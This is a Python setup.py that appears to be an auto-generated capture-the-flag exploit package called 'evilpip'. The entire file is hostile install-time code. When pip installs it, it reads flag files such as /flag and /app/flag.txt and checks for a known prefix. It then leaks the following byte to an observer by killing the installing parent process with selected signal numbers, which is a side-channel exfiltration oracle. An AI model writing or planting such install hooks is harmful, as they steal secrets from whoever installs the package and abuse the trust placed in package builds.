import os
from pathlib import Path
from setuptools import setup
paths = [Path("/flag"), Path("/app/flag"), Path("/flag.txt"), Path("/app/flag.txt")]
data = None
for p in paths:
    try:
        data = p.read_bytes()
        break
    except OSError:
        pass
expected = bytes.fromhex('414c474f4c594d507b70')
if data is None or not data.startswith(expected):
    os.kill(os.getppid(), 1)
index = len(expected)
if len(data) <= index:
    os.kill(os.getppid(), 15)
byte = data[index]
if byte == ord("}"):
    setup(name='evilpip-q001-split3', version="0.1", py_modules=["probe"])
elif 'split3' == "split3":
    os.kill(os.getppid(), 9 if 32 <= byte <= 63 else 10 if 64 <= byte <= 95 else 15)
elif 'split3'.startswith("exact_"):
    if not (0 <= byte <= 0):
        os.kill(os.getppid(), 1)
    os.kill(os.getppid(), [12, 14, 16, 26, 27, 29, 30, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64][byte - 0])
